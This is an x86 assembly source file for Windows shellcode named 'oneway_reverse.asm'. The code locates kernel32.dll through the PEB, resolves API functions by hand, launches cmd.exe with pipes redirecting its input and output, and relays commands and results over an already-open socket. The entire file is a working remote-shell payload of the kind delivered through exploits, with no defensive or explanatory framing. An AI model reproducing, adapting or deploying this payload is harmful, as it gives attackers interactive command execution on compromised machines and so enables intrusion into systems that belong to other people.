; oneway_reverse.asm
; suppose the socket is saved as the [ebp] at the beginning of the shellcode.
section .text
global _start
  _start:
        push ebp
        mov ebp, esp

        sub esp, 0x18                   ; lift up stack, reserve space for local variables

        ; Find kernel32.dll base address
        xor esi, esi                    ; esi = 0
        mov ebx, [fs:esi+0x30]          ; avoid null bytes, to be compatible with fasm, for nasm, use fs:[eax+0x30]
        mov ebx, [ebx + 0x0C]
        mov ebx, [ebx + 0x14] 
        mov ebx, [ebx]  
        mov ebx, [ebx]  
        mov ebx, [ebx + 0x10]           ; now ebx holds kernel32.dll base address

        ; push the function name onto the stack
        xor esi, esi
        push esi                        ; null termination
        push 0x00007373
        push 0x65726464
        push 0x41636f72
        push 0x50746547
        mov [ebp-8], esp                ; pointer to "GetProcAddress" is at ebp-0x8

        mov [ebp-4], ebx                ; base address of kernel32.dll is at ebp-0x4

        ; Find the address of the export table
        mov eax, [ebx + 0x3c]           ; RVA of PE signature
        add eax, ebx                    ; address of PE signature
        mov eax, [eax + 0x78]           ; RVA of export table
        add eax, ebx                    ; address of export table

        ; Find number of exported functions
        mov edx, [eax + 0x14]           ; number of exported functions

        ; Find the address of the address table
        mov ecx, [eax + 0x1c]           ; RVA of address table
        add ecx, ebx                    ; address of address table
        mov [ebp-0x14], ecx             ; address of address table is at ebp-0x14

        ; Find the address of the name pointer table
        mov ecx, [eax + 0x20]           ; RVA of name pointer table
        add ecx, ebx                    ; address of name pointer table
        mov [ebp-0x10], ecx             ; address of name pointer table is at ebp-0x10

        mov ecx, [eax + 0x24]           ; RVA of ordinal table
        add ecx, ebx                    ; address of ordinal table
        mov [ebp-0xc], ecx              ; address of ordinal table is at ebp-0xc

        ; find the address of GetProcAddress
        xor eax, eax                    ; cnt = 0

        .loop:
                mov edi, [ebp-0x10]     ; edi holds the address of name pointer table
                mov esi, [ebp-8]        ; esi points to "GetProcAddress"
                xor ecx, ecx

                cld                     ; set DF=0 => process strings from left to right
                mov edi, [edi + eax*4]  ; edi holds the rva of the entries in name pointer table
                add edi, ebx            ; edi holds the address of the function name
                add cx, 0xe             ; length of strings to compare (len('GetProcAddress') = 14 = 0xe)
                repe cmpsb              ; compare the strings pointed by esi and edi byte by byte. if equal, ZF=1, otherwise, ZF=0
                jz _start.found         ; if not zero, two strings are equal. found it!

                inc eax                 ; cnt++
                cmp eax, edx            ; check if last function is reached
                jb _start.loop          ; if not the last -> go back to the beginning of the loop

                add esp, 0x24                    
                jmp _start.end          ; if function is not found, jump to the end
        .found:
                ; the counter (eax) now holds the position of GetProcAddress

                mov ecx, [ebp-0xc]      ; ecx holds the address of the ordinal table
                mov edx, [ebp-0x14]     ; edx holds the address of the address table

                mov ax, [ecx + eax*2]   ; eax holds the ordinal number of the target function `GetProcAddress` in ordinal table
                mov eax, [edx + eax*4]  ; eax holds the RVA of the target function `GetProcAddress`
                add eax, ebx            ; eax holds the address of the target function `GetProcAddress`
                add esp, 0x28
                push eax                ; address of `GetProcAddress` is at ebp-0x08

        ; use GetProcAddress to find the address of CreateProcessA,LoadLibraryA,Createpipe,PeekNamedPipe,ReadFile and WriteFile
        push 0x00004173
        push 0x7365636f
        push 0x72506574
        push 0x61657243                 ; "CreateProcessA"
        push esp
        push dword [ebp-0x4]            ; base address of kernel32.dll
        call eax                        ; call "GetProcAddress" to get the address of CreateProcessA
        add esp, 0x10                   ; stack rebase
        push eax                        ; address of `CreateProcessA` is at ebp-0xc

        xor eax, eax
        push eax                        ; null termination
        push 0x41797261
        push 0x7262694c
        push 0x64616f4c                 ; "LoadLibraryA"
        push esp
        push dword [ebp-0x4]            ; base address of kernel32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of LoadLibraryA
        add esp, 0x10                   ; stack rebase
        push eax                        ; address of `LoadLibraryA' is at ebp-0x10

        push 0x00006570
        push 0x69506574
        push 0x61657243                 ; "CreatePipe"
        push esp
        push dword [ebp-0x4]            ; base address of kernel32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of CreatePipe
        add esp, 0x0c                   ; stack rebase
        push eax                        ; address of `CreatepPipe` is at ebp-0x14

        push 0x00000065
        push 0x70695064
        push 0x656d614e
        push 0x6b656550
        push esp                        ; "PeekNamedPipe"
        push dword [ebp-0x4]            ; base address of kernel32.dll
        mov eax, [ebp-0x8]
        call eax
        add esp, 0x10                   ; stack rebase
        push eax                        ; address of `PeekNamedPipe` is at ebp-0x18

        xor eax, eax
        push eax
        push 0x656c6946
        push 0x64616552                 ; "ReadFile"
        push esp                        ; "ReadFile"
        push dword [ebp-0x4]            ; base address of kernel32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of ReadFile
        add esp, 0xc                    ; stack rebase
        push eax                        ; address of `ReadFile` is at ebp-0x1c

        push 0x00000065
        push 0x6c694665
        push 0x74697257                 ; "WriteFile"
        push esp
        push dword [ebp-0x4]            ; base address of kernel32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of WriteFile
        add esp, 0xc                    ; stack rebase
        push eax                        ; address of `WriteFile` is at ebp-0x20

        ; use LoadLibraryA to load ws2_32.dll and get the base address
        push 0x00006c6c
        push 0x642e3233
        push 0x5f327377                 ; "ws2_32.dll"
        push esp
        mov eax, [ebp-0x10]
        call eax                        ; call "LoadLibraryA" to load ws2_32.dll
        add esp, 0xc                    ; stack rebase
        push eax                        ; base address of ws2_32.dll is at ebp-0x24

        ; use GetProcAddress to find the address of send and recv
        xor ebx, ebx
        push ebx
        push 0x646e6573                 ; "send"
        push esp
        push dword [ebp-0x24]           ; base address of ws2_32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of send
        add esp, 0x8                    ; stack rebase
        push eax                        ; address of `send` is at ebp-0x28

        xor ebx, ebx
        push ebx
        push 0x76636572                 ; "recv"
        push esp
        push dword [ebp-0x24]           ; base address of ws2_32.dll
        mov eax, [ebp-0x8]
        call eax                        ; call "GetProcAddress" to get the address of recv
        add esp, 0x8                    ; stack rebase
        push eax                        ; address of `recv` is at ebp-0x2c

        ; lift up stack to reserve space for hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2
        ; hReadPipe1 is at ebp-0x30
        ; hWritePipe1 is at ebp-0x34
        ; hReadPipe2 is at ebp-0x38
        ; hWritePipe2 is at ebp-0x3c
        sub esp, 0x10

        ; for pipeattr1
        ; pipeattr1 is at ebp-0x48
        push dword 0x1
        push dword 0x0
        push dword 0xc

        ; for pipeattr2
        ; pipeattr2 is at ebp-0x54
        push dword 0x1
        push dword 0x0
        push dword 0xc

        ; CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
        push dword 0
        lea eax, [ebp-0x48]
        push eax
        lea eax, [ebp-0x34]
        push eax
        lea eax, [ebp-0x30]
        push eax
        mov eax, [ebp-0x14]
        call eax

        ; CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0);
        push dword 0
        lea eax, [ebp-0x54]
        push eax
        lea eax, [ebp-0x3c]
        push eax
        lea eax, [ebp-0x38]
        push eax
        mov eax, [ebp-0x14]
        call eax

        ; CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
        push dword [ebp-0x34]           ; si.hStdError = hWritePipe1
        push dword [ebp-0x34]           ; si.hStdOutput = hWritePipe1
        push dword [ebp-0x38]           ; si.hStdInput = hReadPipe2;
        xor ebx, ebx
        mov ecx, 0x12
        .pushloop:
                cmp ecx, 0
                je _start.pushdone
                push ebx
                sub ecx, 0x1
                jmp _start.pushloop
        .pushdone:
        mov ecx, esp                    ; ecx points to pinfo
        lea edx, [esp+0x10]             ; edx points to sinfo
        mov dword [edx+0x0], 0x44       ; cb
        mov dword [edx+0x2c], 0x100     ; dwFlags
        push 0x00646d63                 ; "cmd"
        mov edi, esp                    ; edi points to "cmd"
        xor eax, eax
        push ecx                        ; pinfo
        push edx                        ; sinfo
        push eax                        ; NULL
        push eax                        ; NULL
        push eax                        ; NULL
        inc eax
        push eax                        ; TRUE
        dec eax
        push eax                        ; NULL
        push eax                        ; NULL
        push edi                        ; "cmd"
        push eax                        ; NULL
        mov eax, [ebp-0xc]              ; `CreateProcessA`
        call eax

        ; PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0)
        sub esp, 0x8                    ; reserve space for lBytesRead, at ebp-0xb4
        sub esp, 0x1000                 ; reserve space for Buff, at ebp-0x10b4
        .peeknamedpipe:
        push 0
        push 0
        lea eax, [ebp-0xb4]
        push eax
        push 0x1000
        lea eax, [ebp-0x10b4]
        push eax
        push dword [ebp-0x30]
        mov eax, [ebp-0x18]
        call eax
        mov eax, [ebp-0xb4]
        cmp eax, 0
        jnz _start.readfile

        ; recv(clientFD,Buff,1024,0);
        push 0x0
        push 0x1000
        lea eax, [ebp-0x10b4]
        push eax
        push dword [ebp+0x4]            ; socket
        mov eax, [ebp-0x2c]             ; recv
        call eax

        ; WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
        push 0
        lea ebx, [ebp-0xb4]
        push ebx
        push eax
        lea eax, [ebp-0x10b4]
        push eax
        push dword [ebp-0x3c]
        mov eax, [ebp-0x20]
        call eax
        jmp _start.peeknamedpipe

        .readfile:
        ; ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
        push 0
        lea eax, [ebp-0xb4]
        push eax
        push dword [ebp-0xb4]
        lea eax, [ebp-0x10b4]
        push eax
        push dword [ebp-0x30]
        mov eax, [ebp-0x1c]
        call eax

        ; send(clientFD,Buff,lBytesRead,0);
        push 0
        push dword [ebp-0xb4]
        lea eax, [ebp-0x10b4]
        push eax
        push dword [ebp+0x4]
        mov eax, [ebp-0x28]
        call eax
        jmp _start.peeknamedpipe

        .end:
